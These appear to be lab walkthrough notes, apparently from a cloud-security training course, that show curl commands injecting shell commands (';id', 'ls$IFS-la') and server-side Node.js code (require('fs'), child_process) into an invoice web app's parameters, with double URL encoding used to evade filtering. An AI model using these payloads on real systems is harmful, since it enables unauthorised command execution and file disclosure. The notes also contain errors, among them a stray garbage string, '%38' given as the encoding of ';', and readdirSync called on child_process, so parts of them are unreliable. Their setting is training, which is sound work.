**Specifies a custom request method to use when communicating with the HTTP server**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data 'system=127.0.0.1'e[ew[edx
```
>


**Test for command injection by adding another command such as ;**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data-raw 'system=127.0.0.1%3Bid'
```
>
    --data-raw :  Used to send raw information with no filtering in cURL. Required to send the embedded commands
    %38        :  URL encoded ;


**Explore the filesystem**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data-raw 'system=127.0.0.1%3Bls%24IFS-la'
```
```
%24: URL Encoded $
IFS: IFS (In this case it would be interpreted as $IFS) stands for Internal Field Separator. In our case that would be a `space`
```

**Executing NodeJS in a shell**

The below command will read the contents of the ambassador.yaml file at the root ('fs') of the file system.
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud --data
"invoiceid=res.end(require('fs').readdirSync('ambassador.yaml').toString())"; echo
```
```
 - readdirSync(): allows you to ls a directory
 - readfileSync(): allows you to cat a file
```

**Double encode the forward slash / with %252**

We double encode because the front-end application would take %2F as a URL string and convert it to a second-order URL.
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud --data
"invoiceid=res.end(require('fs').readdirSync('%252F').toString())"; echo
```

**Trigger command execution with execSync. It will execute a command and pause the response until the command returns**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud --data
"invoiceid=res.end(require('child_process').readdirSync('ls').toString())"; echo
```


  
